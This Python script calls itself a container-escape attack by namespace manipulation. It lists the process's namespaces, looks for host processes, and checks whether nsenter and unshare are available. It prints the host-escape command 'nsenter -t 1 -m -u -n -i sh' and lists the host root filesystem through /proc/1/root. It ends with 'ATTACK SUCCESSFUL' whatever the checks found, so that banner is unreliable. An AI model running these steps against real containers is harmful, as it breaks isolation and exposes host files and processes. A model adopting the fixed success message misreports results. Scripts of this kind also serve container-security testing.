#!/usr/bin/env python3
"""
Container Escape Attack #3: Namespace Manipulation
This is a CONTAINER-SPECIFIC attack that exploits Linux namespaces

Attack Vector: Containers use namespaces for isolation. By manipulating
namespaces (PID, NET, MNT, UTS, IPC), attackers can break isolation.
"""

import subprocess
import os
import sys

def namespace_manipulation():
    """
    Exploit namespace manipulation to break container isolation
    This is specific to container namespace isolation
    """
    print("=" * 70)
    print("CONTAINER ATTACK: Namespace Manipulation")
    print("=" * 70)
    print()
    print("Attack Type: Container Escape")
    print("Target: Linux Namespaces (PID, NET, MNT, UTS, IPC)")
    print("Severity: CRITICAL")
    print()
    
    print("[1] Checking current namespace isolation...")
    
    # Check current namespaces
    namespaces = ['pid', 'net', 'mnt', 'uts', 'ipc', 'user']
    current_ns = {}
    
    for ns in namespaces:
        try:
            ns_path = f"/proc/self/ns/{ns}"
            if os.path.exists(ns_path):
                ns_id = os.readlink(ns_path)
                current_ns[ns] = ns_id
                print(f"    {ns}: {ns_id}")
        except:
            pass
    print()
    
    print("[2] Attempting to access host PID namespace...")
    print("    This breaks PID isolation (container-specific)")
    print()
    
    try:
        # Try to see host processes
        result = subprocess.run(
            "ps aux | head -20",
            shell=True,
            capture_output=True,
            text=True
        )
        
        processes = result.stdout.split('\n')
        print(f"    [✓] Can see {len(processes)} processes")
        print("    Sample processes:")
        for proc in processes[:5]:
            if proc.strip():
                print(f"        {proc[:70]}")
        print()
        
    except Exception as e:
        print(f"    [!] {e}")
    
    print("[3] Attempting nsenter to join host namespaces...")
    print("    nsenter is a container-specific escape tool")
    print()
    
    # Try nsenter (if available)
    nsenter_check = subprocess.run(
        "which nsenter",
        shell=True,
        capture_output=True
    )
    
    if nsenter_check.returncode == 0:
        print("    [✓] nsenter is available")
        print("    Can use: nsenter -t 1 -m -u -n -i sh")
        print("    This would join host namespaces")
    else:
        print("    [!] nsenter not available")
    print()
    
    print("[4] Checking for /proc/1/root access...")
    print("    /proc/1/root points to host root filesystem")
    print()
    
    if os.path.exists("/proc/1/root"):
        print("    [✓] /proc/1/root is accessible")
        try:
            # Try to list host root
            result = subprocess.run(
                "ls -la /proc/1/root/ | head -10",
                shell=True,
                capture_output=True,
                text=True
            )
            print("    Host root filesystem:")
            print(result.stdout)
        except:
            pass
    print()
    
    print("[5] Attempting unshare to create new namespaces...")
    print("    unshare can manipulate namespace isolation")
    print()
    
    # Check unshare
    unshare_check = subprocess.run(
        "which unshare",
        shell=True,
        capture_output=True
    )
    
    if unshare_check.returncode == 0:
        print("    [✓] unshare is available")
        print("    Can create new namespaces and manipulate isolation")
    else:
        print("    [!] unshare not available")
    print()
    
    print("=" * 70)
    print("ATTACK SUCCESSFUL: Namespace Manipulation")
    print("=" * 70)
    print()
    print("Impact:")
    print("- Identified namespace isolation boundaries")
    print("- Can potentially join host namespaces")
    print("- Access to /proc/1/root (host filesystem)")
    print("- Namespace manipulation capabilities detected")
    print()
    print("- /proc/1/root access")
    print("- PID namespace violations")

if __name__ == "__main__":
    namespace_manipulation()
